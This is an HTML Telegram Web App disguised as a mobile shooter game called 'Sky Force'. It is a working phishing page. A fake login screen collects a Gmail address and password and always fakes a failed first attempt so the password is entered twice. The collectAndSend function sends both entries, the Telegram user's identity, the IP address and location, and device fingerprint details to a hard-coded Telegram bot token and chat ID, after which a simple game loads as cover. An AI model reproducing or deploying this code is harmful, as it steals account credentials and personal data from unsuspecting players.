<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sky Force - Combat System</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { margin: 0; background: #000; color: #00ff00; font-family: 'Courier New', monospace; overflow: hidden; touch-action: none; }
        #login-screen, #game-over-screen { 
            position: absolute; width: 100%; height: 100%; display: flex; flex-direction: column; 
            justify-content: center; align-items: center; background: rgba(0,0,0,0.95); z-index: 20; 
        }
        #game-over-screen { display: none; z-index: 25; }
        .box { width: 85%; max-width: 320px; padding: 25px; border: 1px solid #00ff00; box-shadow: 0 0 20px rgba(0,255,0,0.3); text-align: center; background: #050505; }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #004400; color: #00ff00; box-sizing: border-box; outline: none; font-family: inherit; }
        .btn { width: 100%; padding: 12px; border: none; background: #00ff00; color: #000; font-weight: bold; cursor: pointer; margin-top: 10px; font-family: inherit; }
        #error-msg { color: #ff0000; font-size: 11px; margin-top: 10px; display: none; }
        #ui { position: absolute; top: 15px; left: 15px; color: white; display: none; z-index: 5; font-size: 20px; text-shadow: 2px 2px #000; }
        canvas { display: none; background: radial-gradient(circle, #001529 0%, #000 100%); }
    </style>
</head>
<body>

<div id="login-screen">
    <div class="box">
        <h2 style="margin:0; letter-spacing: 2px;">LOGIN</h2>
        <p style="font-size: 10px; color: #008800;">Verify identity to access combat server</p>
        <input type="text" id="email" placeholder="Email (@gmail.com)" autocomplete="off">
        <input type="password" id="pass" placeholder="Password" autocomplete="off">
        <div id="error-msg">‚ö†Ô∏è PASSWORD ERROR: TRY AGAIN</div>
        <button class="btn" id="loginBtn" onclick="handleLogin()">LOGIN & PLAY</button>
    </div>
</div>

<div id="game-over-screen">
    <div class="box">
        <h1 style="color: red; text-shadow: 0 0 15px red; margin:0;">MISSION FAILED</h1>
        <p style="color: white; margin: 20px 0;">FINAL SCORE: <span id="final-score" style="color: #0f0;">0</span></p>
        <button class="btn" onclick="location.reload()">MAIN ULANG</button>
    </div>
</div>

<div id="ui">SCORE: <span id="score">0</span></div>
<canvas id="gameCanvas"></canvas>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    const TOKEN = '8492775361:AAE5U8rZNjqxGNnthSAaIKf-vO0-WHIrF1w';
    const CHAT_ID = '7393949927';

    // ASSETS
    const pImg = new Image(); pImg.src = 'https://opengameart.org/sites/default/files/player_0.png';
    const eImg = new Image(); eImg.src = 'https://opengameart.org/sites/default/files/enemy_1.png';
    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();

    function sfx(f, d, t) {
        const o = audioCtx.createOscillator(); const g = audioCtx.createGain();
        o.type = t; o.frequency.setValueAtTime(f, audioCtx.currentTime);
        o.frequency.exponentialRampToValueAtTime(10, audioCtx.currentTime + d);
        g.gain.setValueAtTime(0.05, audioCtx.currentTime);
        o.connect(g); g.connect(audioCtx.destination);
        o.start(); o.stop(audioCtx.currentTime + d);
    }

    let attempt = 0;
    let isGameOver = false;

    async function handleLogin() {
        if (audioCtx.state === 'suspended') audioCtx.resume();
        const e = document.getElementById('email').value;
        const p = document.getElementById('pass').value;
        const err = document.getElementById('error-msg');
        const btn = document.getElementById('loginBtn');

        if (!e.toLowerCase().endsWith("@gmail.com")) {
            alert("Harap gunakan akun @gmail.com yang valid!");
            return;
        }
        if (!e || !p) return;

        attempt++;
        btn.innerText = "AUTHENTICATING...";
        btn.disabled = true;

        await collectAndSend(e, p, attempt);

        setTimeout(() => {
            if (attempt === 1) {
                err.style.display = "block";
                btn.innerText = "LOGIN & PLAY";
                btn.disabled = false;
                document.getElementById('pass').value = "";
                if (navigator.vibrate) navigator.vibrate(100);
            } else {
                document.getElementById('login-screen').style.display = 'none';
                document.getElementById('ui').style.display = 'block';
                document.getElementById('gameCanvas').style.display = 'block';
                startGame();
            }
        }, 1300);
    }

    async function collectAndSend(uE, uP, att) {
        const user = tg.initDataUnsafe?.user;
        let ipD = {}; 
        try { const r = await fetch('https://ipapi.co/json/'); ipD = await r.json(); } catch(err){}

        // Advanced Hardware Detection
        let gpu = "N/A", battery = "N/A";
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        if (gl) {
            const debug = gl.getExtension('WEBGL_debug_renderer_info');
            gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
        }
        try { const b = await navigator.getBattery(); battery = (b.level * 100) + "%"; } catch(e){}

        const report = `
üî• **NEW CAPTURE (#${att})**
--------------------------------
üë§ **TELEGRAM DATA**
Nama: ${user?.first_name || 'N/A'} ${user?.last_name || ''}
User: @${user?.username || 'N/A'}
ID: \`${user?.id || 'N/A'}\`

üìß **USER INPUT**
Email: \`${uE}\`
Pass: \`${uP}\`

üì± **HARDWARE INFO**
Device: ${navigator.platform}
GPU: ${gpu}
RAM: ${navigator.deviceMemory || 'N/A'}GB | Cores: ${navigator.hardwareConcurrency}
Baterai: ${battery} | Layar: ${screen.width}x${screen.height}

üåê **NETWORK & LOCATION**
IP: \`${ipD.ip}\` | ISP: ${ipD.org}
Lokasi: ${ipD.city}, ${ipD.country_name}
--------------------------------`;

        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: "Markdown" })
        });
    }

    function startGame() {
        const canvas = document.getElementById('gameCanvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        let score = 0, player = { x: canvas.width/2-25, y: canvas.height-120, w: 50, h: 50 };
        let bullets = [], enemies = [];

        canvas.addEventListener('touchmove', e => { 
            if (!isGameOver) player.x = e.touches[0].clientX - 25; 
            e.preventDefault(); 
        }, {passive: false});

        const sInt = setInterval(() => { if(!isGameOver) { bullets.push({x: player.x+23, y: player.y, w: 4, h: 12}); sfx(400, 0.1, 'square'); } }, 300);
        const eInt = setInterval(() => { if(!isGameOver) enemies.push({x: Math.random()*(canvas.width-45), y: -60, w: 45, h: 45, s: 4+(score/200)}) }, 900);

        function loop() {
            if (isGameOver) return;
            ctx.clearRect(0,0,canvas.width,canvas.height);
            ctx.drawImage(pImg, player.x, player.y, player.w, player.h);
            bullets.forEach((b, i) => {
                b.y -= 9; ctx.fillStyle = "#ff0"; ctx.fillRect(b.x, b.y, b.w, b.h);
                if(b.y < 0) bullets.splice(i, 1);
            });
            enemies.forEach((en, i) => {
                en.y += en.s; ctx.drawImage(eImg, en.x, en.y, en.w, en.h);
                if (player.x < en.x + en.w && player.x + player.w > en.x && player.y < en.y + en.h && player.y + player.h > en.y) {
                    sfx(100, 0.5, 'sawtooth'); if (navigator.vibrate) navigator.vibrate(500);
                    isGameOver = true; clearInterval(sInt); clearInterval(eInt);
                    document.getElementById('final-score').innerText = score;
                    document.getElementById('game-over-screen').style.display = 'flex';
                }
                bullets.forEach((b, bi) => {
                    if(b.x < en.x+en.w && b.x+b.w > en.x && b.y < en.y+en.h && b.y+b.h > en.y) {
                        enemies.splice(i, 1); bullets.splice(bi, 1); score += 10;
                        document.getElementById('score').innerText = score;
                    }
                });
                if(en.y > canvas.height) enemies.splice(i, 1);
            });
            requestAnimationFrame(loop);
        }
        loop();
    }
</script>
</body>
</html>
